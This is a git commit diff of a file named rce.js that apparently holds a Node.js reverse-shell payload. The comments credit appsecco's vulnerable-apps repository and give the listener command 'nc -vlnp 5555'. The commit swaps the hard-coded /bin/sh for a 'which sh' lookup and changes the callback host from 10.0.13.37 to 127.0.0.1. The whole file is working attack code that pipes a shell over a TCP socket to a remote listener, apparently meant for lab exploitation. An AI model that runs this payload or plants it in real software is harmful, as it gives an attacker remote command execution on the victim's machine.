cef623d00861d7b4118538f44dd8f75cf4baf2d7
lautalom <lautarolombardi19@gmail.com>
2023-07-21 00:22:09 -0300

    generalize

--- rce.js
+++ rce.js
@@ -1,17 +1,18 @@
-
 // Original: https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
 // Nodejs reverse shell
 // listen with: nc -vlnp 5555
 
-(function(){
-    var net = require("net"),
-        cp = require("child_process"),
-        sh = cp.spawn("/bin/sh", []);
-    var client = new net.Socket();
-    client.connect(5555, "10.0.13.37", function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-    return /a/;
+(function () {
+  var net = require("net"),
+    cp = require("child_process");
+  const { execSync } = require("child_process");
+  const shPath = execSync("which sh").toString().trim();
+  const sh = cp.spawn(shPath, []);
+  var client = new net.Socket();
+  client.connect(5555, "127.0.0.1", function () {
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+  });
+  return /a/;
 })();
